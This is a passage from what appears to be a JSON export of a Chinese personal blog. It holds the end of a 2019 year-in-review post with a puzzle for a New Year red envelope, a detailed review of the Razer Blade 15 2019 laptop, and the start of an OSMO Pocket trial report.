15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 